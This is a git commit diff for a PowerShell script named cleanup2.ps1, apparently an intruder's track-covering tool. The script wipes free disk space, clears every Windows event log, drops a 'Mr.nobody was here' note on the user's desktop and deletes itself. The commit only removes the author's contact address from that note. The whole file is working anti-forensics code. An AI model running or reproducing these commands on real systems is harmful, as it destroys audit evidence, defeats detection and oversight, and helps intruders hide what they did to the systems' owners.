de70d24860dd76297dec95c7d32d033cd16c71e6
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-11-29 05:56:17 +0000

    Update cleanup2.ps1

--- cleanup2.ps1
+++ cleanup2.ps1
@@ -1,4 +1,4 @@
 cipher /w:c:\
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
-Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here, talk to me at Mr.nobodyAl22SU@proton.me"
+Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here"
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
